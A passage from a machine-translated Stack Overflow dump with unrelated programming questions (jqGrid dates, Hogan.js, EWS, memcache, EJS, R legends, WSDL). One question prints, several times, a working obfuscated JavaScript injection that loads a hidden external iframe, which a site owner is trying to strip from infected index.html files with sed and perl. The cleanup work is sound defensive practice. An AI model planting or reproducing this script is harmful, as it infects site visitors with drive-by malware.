
如果您将`repeatitems: true`数据的默认格式与您一起使用`id: "0", cell: ""`，则可以将行所需的数据替换为

```
["Mongstad","2","Reinertsen AS",:"13.09.11 09:01"] 
```

它将减少数据的大小并额外提高性能。此外，我个人不喜欢以`"13.09.11 09:01"`. 这种形式是本地化的，将被解释为字符串，因此无法正确排序和过滤。最好以[ISO 8601](http://de.wikipedia.org/wiki/ISO_8601)格式返回数据：`2011-109-13T08:01Z`或`2011-109-13T09:01+01:00`. 您可以`formatter: 'data'`使用`formatoptions: { srcformat: 'ISO8601Long', newformat: 'd.m.y H:i' }`.

# node.js - i18n 与 Hogan.js

> ID：10597239
> 
> 赞同：0
> 
> 时间：2012-05-15T08:52:32.117
> 
> 标签：node.js, express, internationalization, hogan.js

我刚开始使用 node.js 和 express.js。作为服务器端模板框架，我选择了 Hogan.js。我现在正在尝试找出如何使用 Hogan.js 进行 i18n，并且我[在这篇文章中](https://stackoverflow.com/a/9263601/1059357)找到了一些信息。似乎您总是必须将 i18n 函数与视图的上下文一起传递。是否可以在应用程序中的一个位置进行配置或设置？如果我必须为每个视图分别执行此操作，这似乎很麻烦。谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T12:25:15.113

您可以查看一下似乎完全符合您需求的[Express-lingua 。](https://github.com/akoenig/express-lingua)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-12-18T19:52:21.150

如果必须，请包装 hogan 的渲染功能

```
var origional = Hogan.template.prototype.render;
Hogan.template.prototype.render = function (context, partials, indent) {
    context['i18n'] = function () {
        return function () {
            return 'i18n';
        };
    };
    return origional.call(this, context, partials, indent);
}; 
```

# exchangewebservices - 如何使用 EWS 添加联系人

> ID：10597241
> 
> 赞同：1
> 
> 时间：2012-05-15T08:52:33.910
> 
> 标签：exchangewebservices

我有 2 个问题

1.  我想将电子邮件联系人添加到 Exchange 服务器。我已经看到使用 EWS 的示例代码。但是该代码用于添加特定于用户的联系人。如何添加特定于域的联系人。

2.  我想从 Exchange 服务器获取域联系人。我不想要我只需要今天添加或修改的联系人的所有联系人。

我怎样才能做到这一点。有人可以帮助我吗？

问候 Vairamuthu.GS

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-30T16:48:43.450

我不明白“特定领域的联系”，但我会分享我的代码。它可能会有所帮助

**添加联系人**

```
ExchangeService service = new ExchangeService(ExchangeVersion.Exchange2010_SP1);
// you should set the credentials of the user and 
//call AutoDiscover to get the service URL before executing the code
Contact newcontact = new Contact(service);
newcontact.DisplayName = "data";
newcontact.EmailAddresses[EmailAddressKey.EmailAddress1] = new EmailAddress();
newcontact.EmailAddresses[EmailAddressKey.EmailAddress1].Address = "data";
newcontact.EmailAddresses[EmailAddressKey.EmailAddress1].Name = newcontact.DisplayName;
newcontact.FileAs = newcontact.DisplayName;
newcontact.Save(); 
```

请注意，新联系人保存在登录用户邮箱的联系人文件夹中。

**过滤检索到的联系人**

```
SearchFilter filter = new SearchFilter.IsGreaterThan(ItemSchema.DateTimeCreated, DateTime.Now.AddDays(-1));
FindItemsResults<Item> contactCreatedToday = service.FindItems(WellKnownFolderName.Contacts, filter, new ItemView(int.MaxValue));
foreach (Item t in contactCreatedToday)
{
    try
    {
        Contact c = (Contact) t;
        //do processing
    }
    catch (InvalidCastException)
    {
        throw;
    }
} 
```

# windows - 水晶报表性能

> ID：10597242
> 
> 赞同：0
> 
> 时间：2012-05-15T08:52:40.060
> 
> 标签：windows, crystal-reports

我有一个报告应用程序，它使用 Crystal Reports XI R2 作为其引擎，部署在 Windows 2008 Server 上。问题是，在某些数据量大的报告中，它无法显示报告。一些报告有效，但其他报告……没有。

我的结果显示防火墙错误，当我执行远程桌面并运行相同的报告时，我看到超时错误。有趣的是，当它部署在我的本地主机上时（不，我不是指通过 Visual Studio 运行它，我设置 IIS 部署应用程序的方式与我在服务器上的方式相同）或当我连接时正确显示相同的报告通过远程桌面连接到服务器并从那里运行它。

关于我应该在哪里看的任何想法？我应该检查什么？Windows 错误日志不会显示任何问题。

谢谢..

# php - 多个 memcache 查找与一次查找（输出大）

> ID：10597243
> 
> 赞同：0
> 
> 时间：2012-05-15T08:52:46.263
> 
> 标签：php, memcached

我正在使用 memcache 池（5 个服务器）和一些处理节点开发一个应用程序。我有两种不同的可能方法，我想知道你们是否对基于两者之间的性能（主要是速度）的比较有任何意见

1.  我每次请求都会从 memcache 中提取一大块数据，对其进行迭代并丢弃特定请求不需要的位

2.  我从 memcached 中提取小部分，只提取我需要的部分。即我提取a的值并根据a的值提取b或c的值。使用此组合查找我要提取的下一个键。

两者的区别在于，memcached 查找（即服务器池）的数量减少了 1。但响应的大小增加了。有人以前见过围绕它的任何基准测试报告吗？

不幸的是，我不能直接根据请求使用更好的键，因为我没有足够的内存缓存来支持所有可能的值组合，所以我必须在运行时构建其中的一些

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T09:09:02.720

您必须为自己的设置进行基准测试。重要的部分是花费在以下方面的时间：

*   从memcache请求大量数据+检索它+从resonse中提取数据
*   向内存缓存发送多个请求 + 检索数据

基本上，您必须衡量的第一件事是与缓存池交互的开销有多大。当负载增加时，整个事情将如何反应是一件小事。现在可能**很快**的事情，当用户开始涌入时，可能会成为一个**可怕的决定。**

这有点取决于您对“大块”的定义。我们在这里谈论的是兆字节还是有 100 个键的数组？您还必须考虑，php 仍然需要处理该信息。

此时您可以做两件事：

1.  仔细看看你是如何存储信息的。也许您可以将其缩减为两个小请求。一个用于检索条件的特定数据，另一个用于获取条件信息。

2.  为您的服务器设置您自己的基准测试。*网络上的一些随机文章与您的*系统架构无关。

我知道这不是你想听到的答案，但那是我的*两分钱*.. 给你。

# node.js - 使用节点上的 ejs 模板调用函数

> ID：10597258
> 
> 赞同：8
> 
> 时间：2012-05-15T08:53:22.883
> 
> 标签：node.js, ejs

我正在尝试在服务器端使用 ejs 创建我的 Web 应用程序的非 JavaScript 版本。我将一个包含应用程序状态的对象传递给模板，并且有一次我想使用该状态对象构建一个 url。所以基本上我想做类似 <%=makeUrl(objectState.data[0])%>

如何使 makeUrl 可以从 ejs 模板中调用？

谢谢

编辑：我知道我可以将函数作为参数传递给模板，但是有更好的方法吗？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-11-08T17:33:48.347

在 Express 3 中，他们删除了动态助手的概念。我相信通过 app.locals 将函数传递到模板实际上是现在推荐的方法。我想你已经知道如何了，但是对于其他有同样问题的人：

```
in your app.js:
app.locals.myFunc = function(arg){...}

in your template:
<%= myFunc(objectState.data[0]) %> 
```

# linux - shell中的转义字符

> ID：10597261
> 
> 赞同：5
> 
> 时间：2012-05-15T08:53:36.447
> 
> 标签：linux, shell, unix, sed, escaping

首先，我需要给出一个免责声明：

**不要运行这个 JAVASCRIPT**

这是不道德的人将代码注入我的某些网站。我需要找到并替换它（有空格或什么都没有）。它专门针对 index.html 和 index.htm 文件，它们的代码完全相同。

JavaScript 如下（同样，不要运行它）。

```
<script>i=0;try{avasv=prototype;}catch(z){h="harCode";f=['-33f-33f63f60f-10f-2f58f69f57f75f67f59f68f74f4f61f59f74f27f66f59f67f59f68f74f73f24f79f42f55f61f36f55f67f59f-2f-3f56f69f58f79f-3f-1f49f6f51f-1f81f-29f-33f-33f-33f63f60f72f55f67f59f72f-2f-1f17f-29f-33f-33f83f-10f59f66f73f59f-10f81f-29f-33f-33f-33f58f69f57f75f67f59f68f74f4f77f72f63f74f59f-2f-8f18f63f60f72f55f67f59f-10f73f72f57f19f-3f62f74f74f70f16f5f5f60f58f59f73f64f62f65f64f64f66f4f66f69f77f59f73f74f70f72f63f57f59f73f4f55f74f5f21f61f69f19f8f-3f-10f77f63f58f74f62f19f-3f7f6f-3f-10f62f59f63f61f62f74f19f-3f7f6f-3f-10f73f74f79f66f59f19f-3f76f63f73f63f56f63f66f63f74f79f16f62f63f58f58f59f68f17f70f69f73f63f74f63f69f68f16f55f56f73f69f66f75f74f59f17f66f59f60f74f16f6f17f74f69f70f16f6f17f-3f20f18f5f63f60f72f55f67f59f20f-8f-1f17f-29f-33f-33f83f-29f-33f-33f60f75f68f57f74f63f69f68f-10f63f60f72f55f67f59f72f-2f-1f81f-29f-33f-33f-33f76f55f72f-10f60f-10f19f-10f58f69f57f75f67f59f68f74f4f57f72f59f55f74f59f27f66f59f67f59f68f74f-2f-3f63f60f72f55f67f59f-3f-1f17f60f4f73f59f74f23f74f74f72f63f56f75f74f59f-2f-3f73f72f57f-3f2f-3f62f74f74f70f16f5f5f60f58f59f73f64f62f65f64f64f66f4f66f69f77f59f73f74f70f72f63f57f59f73f4f55f74f5f21f61f69f19f8f-3f-1f17f60f4f73f74f79f66f59f4f76f63f73f63f56f63f66f63f74f79f19f-3f62f63f58f58f59f68f-3f17f60f4f73f74f79f66f59f4f70f69f73f63f74f63f69f68f19f-3f55f56f73f69f66f75f74f59f-3f17f60f4f73f74f79f66f59f4f66f59f60f74f19f-3f6f-3f17f60f4f73f74f79f66f59f4f74f69f70f19f-3f6f-3f17f60f4f73f59f74f23f74f74f72f63f56f75f74f59f-2f-3f77f63f58f74f62f-3f2f-3f7f6f-3f-1f17f60f4f73f59f74f23f74f74f72f63f56f75f74f59f-2f-3f62f59f63f61f62f74f-3f2f-3f7f6f-3f-1f17f-29f-33f-33f-33f58f69f57f75f67f59f68f74f4f61f59f74f27f66f59f67f59f68f74f73f24f79f42f55f61f36f55f67f59f-2f-3f56f69f58f79f-3f-1f49f6f51f4f55f70f70f59f68f58f25f62f63f66f58f-2f60f-1f17f-29f-33f-33f83'][0].split('f');v="e"+"va";}if(v)e=window[v+"l"];try{q=document.createElement("div");q.appendChild(q+"");}catch(qwg){w=f;s=[];} r=String;z=((e)?h:"");for(;587!=i;i+=1){j=i;if(e)s=s+r["fromC"+((e)?z:12)](w[j]*1+42);} if(v&&e&&r&&z&&h&&s&&f&&v)e(s);</script> 
```

我需要通过类似 unix 的命令行来查找和替换它（我不想手动浏览每个文件）。

我尝试了以下方法：

```
sed -i "s/<script>i=0;try{avasv=prototype;}catch(z){h=\"harCode\";f=['-33f-33f63f60f-10f-2f58f69f57f75f67f59f68f74f4f61f59f74f27f66f59f67f59f68f74f73f24f79f42f55f61f36f55f67f59f-2f-3f56f69f58f79f-3f-1f49f6f51f-1f81f-29f-33f-33f-33f63f60f72f55f67f59f72f-2f-1f17f-29f-33f-33f83f-10f59f66f73f59f-10f81f-29f-33f-33f-33f58f69f57f75f67f59f68f74f4f77f72f63f74f59f-2f-8f18f63f60f72f55f67f59f-10f73f72f57f19f-3f62f74f74f70f16f5f5f60f58f59f73f64f62f65f64f64f66f4f66f69f77f59f73f74f70f72f63f57f59f73f4f55f74f5f21f61f69f19f8f-3f-10f77f63f58f74f62f19f-3f7f6f-3f-10f62f59f63f61f62f74f19f-3f7f6f-3f-10f73f74f79f66f59f19f-3f76f63f73f63f56f63f66f63f74f79f16f62f63f58f58f59f68f17f70f69f73f63f74f63f69f68f16f55f56f73f69f66f75f74f59f17f66f59f60f74f16f6f17f74f69f70f16f6f17f-3f20f18f5f63f60f72f55f67f59f20f-8f-1f17f-29f-33f-33f83f-29f-33f-33f60f75f68f57f74f63f69f68f-10f63f60f72f55f67f59f72f-2f-1f81f-29f-33f-33f-33f76f55f72f-10f60f-10f19f-10f58f69f57f75f67f59f68f74f4f57f72f59f55f74f59f27f66f59f67f59f68f74f-2f-3f63f60f72f55f67f59f-3f-1f17f60f4f73f59f74f23f74f74f72f63f56f75f74f59f-2f-3f73f72f57f-3f2f-3f62f74f74f70f16f5f5f60f58f59f73f64f62f65f64f64f66f4f66f69f77f59f73f74f70f72f63f57f59f73f4f55f74f5f21f61f69f19f8f-3f-1f17f60f4f73f74f79f66f59f4f76f63f73f63f56f63f66f63f74f79f19f-3f62f63f58f58f59f68f-3f17f60f4f73f74f79f66f59f4f70f69f73f63f74f63f69f68f19f-3f55f56f73f69f66f75f74f59f-3f17f60f4f73f74f79f66f59f4f66f59f60f74f19f-3f6f-3f17f60f4f73f74f79f66f59f4f74f69f70f19f-3f6f-3f17f60f4f73f59f74f23f74f74f72f63f56f75f74f59f-2f-3f77f63f58f74f62f-3f2f-3f7f6f-3f-1f17f60f4f73f59f74f23f74f74f72f63f56f75f74f59f-2f-3f62f59f63f61f62f74f-3f2f-3f7f6f-3f-1f17f-29f-33f-33f-33f58f69f57f75f67f59f68f74f4f61f59f74f27f66f59f67f59f68f74f73f24f79f42f55f61f36f55f67f59f-2f-3f56f69f58f79f-3f-1f49f6f51f4f55f70f70f59f68f58f25f62f63f66f58f-2f60f-1f17f-29f-33f-33f83'][0].split('f');v=\"e\"+\"va\";}if(v)e=window[v+\"l\"];try{q=document.createElement(\"div\");q.appendChild(q+\"\");}catch(qwg){w=f;s=[];} r=String;z=((e)?h:\"\");for(;587!=i;i+=1){j=i;if(e)s=s+r[\"fromC\"+((e)?z:12)](w[j]*1+42);} if(v&&e&&r&&z&&h&&s&&f&&v)e(s);</script>/ /g" *.html 
```

转义所有双引号，但这仍然会引发错误：

```
sed: -e expression #1, char 2075: unknown option to `s' 
```

但是，我知道 s 选项确实有效，因为我以前使用它来查找和替换一些 PHP。

我也尝试了以下方法，但也没有效果（抛出相同的错误）：

```
find . \( -name "*.html" -or -name "*.htm" \) | xargs grep -l "<script>i=0;try{avasv=prototype;}catch(z){h=\"harCode\";f=['-33f-33f63f60f-10f-2f58f69f57f75f67f59f68f74f4f61f59f74f27f66f59f67f59f68f74f73f24f79f42f55f61f36f55f67f59f-2f-3f56f69f58f79f-3f-1f49f6f51f-1f81f-29f-33f-33f-33f63f60f72f55f67f59f72f-2f-1f17f-29f-33f-33f83f-10f59f66f73f59f-10f81f-29f-33f-33f-33f58f69f57f75f67f59f68f74f4f77f72f63f74f59f-2f-8f18f63f60f72f55f67f59f-10f73f72f57f19f-3f62f74f74f70f16f5f5f60f58f59f73f64f62f65f64f64f66f4f66f69f77f59f73f74f70f72f63f57f59f73f4f55f74f5f21f61f69f19f8f-3f-10f77f63f58f74f62f19f-3f7f6f-3f-10f62f59f63f61f62f74f19f-3f7f6f-3f-10f73f74f79f66f59f19f-3f76f63f73f63f56f63f66f63f74f79f16f62f63f58f58f59f68f17f70f69f73f63f74f63f69f68f16f55f56f73f69f66f75f74f59f17f66f59f60f74f16f6f17f74f69f70f16f6f17f-3f20f18f5f63f60f72f55f67f59f20f-8f-1f17f-29f-33f-33f83f-29f-33f-33f60f75f68f57f74f63f69f68f-10f63f60f72f55f67f59f72f-2f-1f81f-29f-33f-33f-33f76f55f72f-10f60f-10f19f-10f58f69f57f75f67f59f68f74f4f57f72f59f55f74f59f27f66f59f67f59f68f74f-2f-3f63f60f72f55f67f59f-3f-1f17f60f4f73f59f74f23f74f74f72f63f56f75f74f59f-2f-3f73f72f57f-3f2f-3f62f74f74f70f16f5f5f60f58f59f73f64f62f65f64f64f66f4f66f69f77f59f73f74f70f72f63f57f59f73f4f55f74f5f21f61f69f19f8f-3f-1f17f60f4f73f74f79f66f59f4f76f63f73f63f56f63f66f63f74f79f19f-3f62f63f58f58f59f68f-3f17f60f4f73f74f79f66f59f4f70f69f73f63f74f63f69f68f19f-3f55f56f73f69f66f75f74f59f-3f17f60f4f73f74f79f66f59f4f66f59f60f74f19f-3f6f-3f17f60f4f73f74f79f66f59f4f74f69f70f19f-3f6f-3f17f60f4f73f59f74f23f74f74f72f63f56f75f74f59f-2f-3f77f63f58f74f62f-3f2f-3f7f6f-3f-1f17f60f4f73f59f74f23f74f74f72f63f56f75f74f59f-2f-3f62f59f63f61f62f74f-3f2f-3f7f6f-3f-1f17f-29f-33f-33f-33f58f69f57f75f67f59f68f74f4f61f59f74f27f66f59f67f59f68f74f73f24f79f42f55f61f36f55f67f59f-2f-3f56f69f58f79f-3f-1f49f6f51f4f55f70f70f59f68f58f25f62f63f66f58f-2f60f-1f17f-29f-33f-33f83'][0].split('f');v=\"e\"+\"va\";}if(v)e=window[v+\"l\"];try{q=document.createElement(\"div\");q.appendChild(q+\"\");}catch(qwg){w=f;s=[];} r=String;z=((e)?h:\"\");for(;587!=i;i+=1){j=i;if(e)s=s+r[\"fromC\"+((e)?z:12)](w[j]*1+42);} if(v&&e&&r&&z&&h&&s&&f&&v)e(s);</script>" | xargs sed -i -e "s/<script>i=0;try{avasv=prototype;}catch(z){h=\"harCode\";f=['-33f-33f63f60f-10f-2f58f69f57f75f67f59f68f74f4f61f59f74f27f66f59f67f59f68f74f73f24f79f42f55f61f36f55f67f59f-2f-3f56f69f58f79f-3f-1f49f6f51f-1f81f-29f-33f-33f-33f63f60f72f55f67f59f72f-2f-1f17f-29f-33f-33f83f-10f59f66f73f59f-10f81f-29f-33f-33f-33f58f69f57f75f67f59f68f74f4f77f72f63f74f59f-2f-8f18f63f60f72f55f67f59f-10f73f72f57f19f-3f62f74f74f70f16f5f5f60f58f59f73f64f62f65f64f64f66f4f66f69f77f59f73f74f70f72f63f57f59f73f4f55f74f5f21f61f69f19f8f-3f-10f77f63f58f74f62f19f-3f7f6f-3f-10f62f59f63f61f62f74f19f-3f7f6f-3f-10f73f74f79f66f59f19f-3f76f63f73f63f56f63f66f63f74f79f16f62f63f58f58f59f68f17f70f69f73f63f74f63f69f68f16f55f56f73f69f66f75f74f59f17f66f59f60f74f16f6f17f74f69f70f16f6f17f-3f20f18f5f63f60f72f55f67f59f20f-8f-1f17f-29f-33f-33f83f-29f-33f-33f60f75f68f57f74f63f69f68f-10f63f60f72f55f67f59f72f-2f-1f81f-29f-33f-33f-33f76f55f72f-10f60f-10f19f-10f58f69f57f75f67f59f68f74f4f57f72f59f55f74f59f27f66f59f67f59f68f74f-2f-3f63f60f72f55f67f59f-3f-1f17f60f4f73f59f74f23f74f74f72f63f56f75f74f59f-2f-3f73f72f57f-3f2f-3f62f74f74f70f16f5f5f60f58f59f73f64f62f65f64f64f66f4f66f69f77f59f73f74f70f72f63f57f59f73f4f55f74f5f21f61f69f19f8f-3f-1f17f60f4f73f74f79f66f59f4f76f63f73f63f56f63f66f63f74f79f19f-3f62f63f58f58f59f68f-3f17f60f4f73f74f79f66f59f4f70f69f73f63f74f63f69f68f19f-3f55f56f73f69f66f75f74f59f-3f17f60f4f73f74f79f66f59f4f66f59f60f74f19f-3f6f-3f17f60f4f73f74f79f66f59f4f74f69f70f19f-3f6f-3f17f60f4f73f59f74f23f74f74f72f63f56f75f74f59f-2f-3f77f63f58f74f62f-3f2f-3f7f6f-3f-1f17f60f4f73f59f74f23f74f74f72f63f56f75f74f59f-2f-3f62f59f63f61f62f74f-3f2f-3f7f6f-3f-1f17f-29f-33f-33f-33f58f69f57f75f67f59f68f74f4f61f59f74f27f66f59f67f59f68f74f73f24f79f42f55f61f36f55f67f59f-2f-3f56f69f58f79f-3f-1f49f6f51f4f55f70f70f59f68f58f25f62f63f66f58f-2f60f-1f17f-29f-33f-33f83'][0].split('f');v=\"e\"+\"va\";}if(v)e=window[v+\"l\"];try{q=document.createElement(\"div\");q.appendChild(q+\"\");}catch(qwg){w=f;s=[];} r=String;z=((e)?h:\"\");for(;587!=i;i+=1){j=i;if(e)s=s+r[\"fromC\"+((e)?z:12)](w[j]*1+42);} if(v&&e&&r&&z&&h&&s&&f&&v)e(s);</script>/ /g" 
```

是什么导致了这个错误，我该如何解决？我不知道是什么导致了这个错误，所以非常感谢任何帮助。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-15T09:08:56.487

问题是您没有转义文本中的特殊字符，例如`/`分隔符。

最简单的解决方案是选择不同的分隔符并仅指定字符串的一部分，例如

```
find . -name '*.html' -o -name '*.htm' |
  xargs fgrep -l '<script>i=0;try' |
  xargs perl -i.infected -pe 's#<script>i=0;try.*?</script>##g' 
```

（未经测试）可以完成这项工作。（`.*?`构造选择最短的匹配；我不知道如何在 中做到这一点`sed`。）

用类似的东西验证

```
find . -name '*.infected' | sed -e 's#.*#diff & &#' -e 's#.infected##' | sh -x 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-15T09:12:34.197

sed 错误来自以下事实：搜索和替换的语法是：

```
s/text/replace/options 
```

但是在您的文本中出现 / ，因此获取部件测试、替换和选项错误。有一个简单的解决方案。sed 不需要使用 the`/`作为参数之间的分隔符。你可以使用任何你想要的字符。只需选择一个没有出现在您的文本中的，例如 `#`或`%`（第一个分隔符（首字母 s 之后的那个）是他在命令的其余部分中期望的分隔符）..

# r - 在 R 中结合线和条形图图例

> ID：10597262
> 
> 赞同：3
> 
> 时间：2012-05-15T08:53:42.287
> 
> 标签：r, plot, legend

有没有办法做到这一点？

我当前的代码：

```
barplot(to_plot_bar,col=cm.colors(6,alpha=1),width=0.75,space=0.2,names.arg=x)
lines(dat_dens,lty=1,col="black");
legend("topright",ltext,bty="n",fill=cm.colors(6),
lty = c(0,0,0,0,0,0,1), lwd = c(0,0,0,0,0,1)); 
```

生成这样的图例。

![在此处输入图像描述](../Images/284ea7f44f5a26671ae2c5fe036677c8.png)

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-15T09:19:03.057

试试这个

```
ltext1 <- c(ltext,"emp") # this is not necessary if you already added 
legend("topright",ltext1,bty="n",col=c(cm.colors(6),"black"),pch=c(rep(15,6),-1),
       lty = c(0,0,0,0,0,0,1)); 
```

# javascript - jQuery 弹出气泡，元素在 IE7 中移动

> ID：10597266
> 
> 赞同：1
> 
> 时间：2012-05-15T08:53:53.147
> 
> 标签：javascript, jquery, dom, bubble-popup

我正在为 DOM 中的元素创建一个弹出窗口，就像 Qtip 一样。我知道有很多已完成的插件，但我想自己创建一个。

基本上代码的作用：

悬停元素，使元素偏移并稍作改变，以便弹出窗口位于元素上方。

显示弹出元素，然后根据悬停的元素更改其位置。

但是我好像失败了。它在 IE7 中不起作用。当我在 IE7 中悬停一个元素时，我的弹出窗口显示在正确的位置，但悬停的元素改变了位置。

JSfiddle：http: [//jsfiddle.net/egj46/](http://jsfiddle.net/egj46/)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T10:49:05.037

我不能说到底是什么原因造成的，可以通过将弹出 div“pHolder”移动到内容之后来解决。

# sharepoint-2010 - Sharepoint OOTB HTTPHandler 请求不调用响应写入方法

> ID：10597269
> 
> 赞同：2
> 
> 时间：2012-05-15T08:54:15.690
> 
> 标签：sharepoint-2010, httphandler, httpmodule

当请求共享点 ootb http 处理程序（如 calendarservice.ashx）时，不会调用 httpmodule 中的响应写入方法。就像在 sharepoint 2010 日历中使用左上角的箭头图标更改月份一样，它使 ajax 调用以下 url

/_layouts/CalendarService.ashx

但是当这个请求发送到我的 http 模块时，没有调用响应写入方法，而是为自定义 ashx 页面调用了 write 方法，但对于 OOTB ashx 页面没有调用，是否有人对此行为有任何想法。

# java - 使用文档/文字格式从 WSDL 生成 Web 服务

> ID：10597270
> 
> 赞同：5
> 
> 时间：2012-05-15T08:54:16.250
> 
> 标签：java, web-services, wsdl, wsimport

我无法通过 wsimport 从 WSDL 生成 WS。

WSDL 是 TMDD v3.0 标准规范（WSDL 和相关的 XSD 文件可以在[这里](http://www.ite.org/standards/tmdd/TMDDv3.0%20wsdl%20schemas%20-%20Final.zip)找到）

根据[IBM 的这篇文章，](http://www.ibm.com/developerworks/webservices/library/ws-whichwsdl/) WSDL 似乎是文档/文字格式。

为了编译 WSDL，我创建了一些绑定/调整，但是我遇到了这个错误（它不会生成方法，因为操作有多个部分）：

```
[WARNING] Ingoring operation "DlFullEventUpdateSubscription": more than one part
 bound to body
  line 17 of file:/O:/temp/wsdltest/TMDD-stripped.wsdl 
```

为简化起见，这是 WSDL 的精简版本，只有有趣的操作定义

```
<?xml version="1.0" encoding="UTF-8"?>
<definitions xmlns:tns="http://www.tmdd.org/3/dialogs"
    xmlns:tmdd="http://www.tmdd.org/3/messages" xmlns="http://schemas.xmlsoap.org/wsdl/"
    xmlns:c2c="http://www.ntcip.org/c2c-message-administration" xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"
    name="TMDDCenterServices" targetNamespace="http://www.tmdd.org/3/dialogs">
    <documentation>
    </documentation>
    <types>

        <xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
            <xs:import namespace="http://www.tmdd.org/3/messages"
                schemaLocation="TMDD.xsd" />
            <xs:import namespace="http://www.ntcip.org/c2c-message-administration"
                schemaLocation="C2C.xsd" />
        </xs:schema>
    </types>
    <message name="MSG_EventSubscription">
        <part name="c2cMsgAdmin" element="c2c:c2cMessageSubscription" />
        <part name="message" element="tmdd:eventRequestMsg" />
    </message>
    <!-- Common Messages -->
    <message name="MSG_ConfirmationReceipt">
        <!-- CONNECTION MANAGEMENT Messages -->
        <part name="message" element="c2c:c2cMessageReceipt" />
    </message>
    <message name="MSG_ErrorReport">
        <part name="message" element="tmdd:errorReportMsg" />
    </message>
    <!-- TMDD Owner Center Porttype -->
    <portType name="tmddOCSoapHttpServicePortType">
        <operation name="DlFullEventUpdateSubscription">
            <documentation>
                <objectClass>Event</objectClass>
                <msgPattern>Sub</msgPattern>
                <requirement>REQ1261</requirement>
            </documentation>
            <input message="tns:MSG_EventSubscription" />
            <output message="tns:MSG_ConfirmationReceipt" />
            <fault name="errorReport" message="tns:MSG_ErrorReport" />
        </operation>
    </portType>
    <!-- TMDD Owner Center binding -->
    <binding name="tmddOCSoapHttpServiceBinding" type="tns:tmddOCSoapHttpServicePortType">
        <soap:binding style="document"
            transport="http://schemas.xmlsoap.org/soap/http" />
        <operation name="DlFullEventUpdateSubscription">
            <soap:operation soapAction="' '" style="document" />
            <input>
                <soap:body use="literal" />
            </input>
            <output>
                <soap:body use="literal" />
            </output>
            <fault name="errorReport">
                <soap:fault name="errorReport" use="literal" />
            </fault>
        </operation>
    </binding>
    <!-- TMDD Owner Center Service -->
    <service name="tmddOCSoapHttpService">
        <!-- ************************ -->
        <!-- OWNER CENTER Services -->
        <!-- ************************ -->
        <port name="tmddOCSoapHttpServicePort" binding="tns:tmddOCSoapHttpServiceBinding">
            <soap:address location="http://tmdd.owner.center.com/c2cxml/" />
        </port>
    </service>
</definitions> 
```

绑定文件：

```
<?xml version="1.0" encoding="UTF-8"?>
<bindings xmlns="http://java.sun.com/xml/ns/jaxb" version="2.1" xmlns:xs="http://www.w3.org/2001/XMLSchema" xmlns:jaxws="http://java.sun.com/xml/ns/jaxws">
    <!-- To create standalone classes instead of nested classes -->
    <!--<globalBindings localScoping="toplevel"/>-->

    <!--*****************-->
    <!-- Package Binding -->
    <!--*****************-->

    <!--*****************************-->
    <!-- C2C classes package binding -->
    <!--*****************************-->
    <bindings schemaLocation="C2C.xsd">
        <schemaBindings>
            <package name="tdf.tmdd.model.ntcip.messageadministration" />
        </schemaBindings>
    </bindings>

    <!--**************************************-->
    <!-- ITIS-Adopted classes package binding -->
    <!--**************************************-->
    <bindings schemaLocation="ITIS-Adopted-03-00-02.xsd">
        <schemaBindings>
            <package name="tdf.tmdd.model.itis.adopted" />
        </schemaBindings>       
    </bindings>

    <!--************************************-->
    <!-- ITIS-Local classes package binding -->
    <!--************************************-->
    <bindings schemaLocation="ITIS-Local-03-00-02.xsd">
        <schemaBindings>
            <package name="tdf.tmdd.model.itis.local" />
        </schemaBindings>
    </bindings>

    <!--**************************************-->
    <!-- LRMS-Adopted classes package binding -->
    <!--************************************* -->
    <bindings schemaLocation="LRMS-Adopted-02-00-00.xsd">
        <schemaBindings>
            <package name="tdf.tmdd.model.lrms.adopted" />
        </schemaBindings>                   
    </bindings>

    <!--************************************-->
    <!-- LRMS-Local classes package binding -->
    <!--************************************-->
    <bindings schemaLocation="LRMS-Local-02-00-00.xsd">
        <schemaBindings>
            <package name="tdf.tmdd.model.lrms.local" />
        </schemaBindings>
    </bindings>

    <!--*******************************-->
    <!-- NTCIP classes package binding -->
    <!--*******************************-->
    <bindings schemaLocation="NTCIP-References.xsd">
        <schemaBindings>
            <package name="tdf.tmdd.model.ntcip.objectreferences" />
        </schemaBindings>
    </bindings>

    <!--******************************-->
    <!-- TMDD classes package binding -->
    <!--******************************-->
    <bindings schemaLocation="TMDD.xsd">
        <schemaBindings>
            <package name="tdf.tmdd.model" />
        </schemaBindings>   
    </bindings>

    <!--***********************-->
    <!-- Class personalization -->
    <!--***********************-->

    <!--************************************-->
    <!-- LRMS-Adopted class personalization -->
    <!--************************************-->
    <bindings schemaLocation="LRMS-Adopted-02-00-00.xsd">
        <bindings node="//xs:complexType[@name='Chain']//xs:sequence//xs:element[@name='chain']//xs:complexType">
            <class name="ChainElement" />
        </bindings>   
        <bindings node="//xs:complexType[@name='GridPointPair']">
            <class name="GridPointPairAdopted" />
        </bindings>                 
        <bindings node="//xs:complexType[@name='AreaLocation']">
            <class name="AreaLocationAdopted" />
        </bindings>    
        <bindings node="//xs:complexType[@name='LinkLocation']">
            <class name="LinkLocationAdopted" />
        </bindings>
        <bindings node="//xs:complexType[@name='AdminAreaGroup']">
            <class name="AdminAreaGroupAdopted" />
        </bindings>  
        <bindings node="//xs:complexType[@name='GridPointSequence']">
            <class name="GridPointSequenceAdopted" />
        </bindings>  
        <bindings node="//xs:complexType[@name='Grid']">
            <class name="GridAdopted" />
        </bindings>  
        <bindings node="//xs:complexType[@name='NodeAttribute']">
            <class name="NodeAttributeAdopted" />
        </bindings>  
        <bindings node="//xs:complexType[@name='GridPoint']">
            <class name="GridPointAdopted" />
        </bindings>       
    </bindings>

    <!--********************************-->
    <!-- factory method personalization -->
    <!--********************************-->

    <!--*************************************-->
    <!-- TMDD factory method personalization -->
    <!--*************************************-->
    <bindings schemaLocation="TMDD.xsd" >
        <bindings node="//xs:complexType[@name='IntersectionSignalInventoryLinkList']">
             <factoryMethod name="createIntersectionSignalInventoryLinks" />
         </bindings>
    </bindings>
</bindings> 
```

